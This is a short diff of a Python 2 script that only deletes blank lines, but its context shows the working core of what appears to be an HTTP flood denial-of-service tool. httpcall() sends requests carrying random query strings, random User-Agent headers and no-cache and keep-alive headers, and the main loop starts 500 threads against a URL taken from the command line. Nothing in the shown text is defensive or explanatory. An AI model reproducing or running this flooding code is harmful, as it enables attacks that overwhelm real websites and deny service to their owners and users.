@@ -59,7 +59,6 @@ def buildblock(size):
 	for i in range(0, size):
 		a = random.randint(65, 90)
 		out_str += chr(a)
-
 	return(out_str)
 
 def usage():
@@ -74,7 +73,6 @@ def httpcall(url):
 		param_joiner = "&"
 	else:
 		param_joiner = "?"
-
 	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
@@ -83,7 +81,6 @@ def httpcall(url):
 	request.add_header('Keep-Alive', random.randint(110,120))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
-
 	try:
 			inc_counter()
 			urllib2.urlopen(request)
@@ -95,7 +92,6 @@ def httpcall(url):
 	except urllib2.URLError, e:
 			print e.reason
 			sys.exit()
-
 	return(code)		
 
 	
@@ -134,11 +130,9 @@ else:
 		if len(sys.argv) == 3:
 			if sys.argv[2] == "safe":
 				set_safe()
-
 		url = sys.argv[1]
 		if url.count("/") == 2:
 			url = url + "/"
-
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
